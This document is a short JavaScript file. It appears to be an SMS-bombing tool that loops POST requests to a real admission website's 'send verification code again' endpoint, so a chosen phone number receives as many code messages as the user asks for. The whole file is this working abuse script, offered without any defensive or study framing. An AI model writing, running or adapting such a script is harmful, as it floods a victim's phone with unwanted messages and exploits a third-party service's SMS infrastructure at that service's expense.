const url = "https://admission.medico.com.bd/2023/send_vercode_again";
const headers = new Headers({
  "Content-Type": "application/x-www-form-urlencoded",
});

function makeRequests() {
  const number = document.getElementById("phoneNumber").value;
  const amount = document.getElementById("requestAmount").value;
  const logElement = document.getElementById("requestsLog");

  const data = new URLSearchParams();
  data.append("phone", number);

  for (let i = 0; i < amount; i++) {
    fetch(url, {
      method: "POST",
      headers: headers,
      body: data,
    })
      .then((response) => response.text())
      .then((responseData) => {
        logElement.innerHTML += `<p>Request ${i + 1}: ${responseData}</p>`;
        if (responseData.includes("Msg sent")) {
          logElement.innerHTML += `<p class="success">Msg sent successfully!</p>`;
        }
      })
      .catch((error) => {
        logElement.innerHTML += `<p>Error in Request ${i + 1}: ${error}</p>`;
      });
  }
}
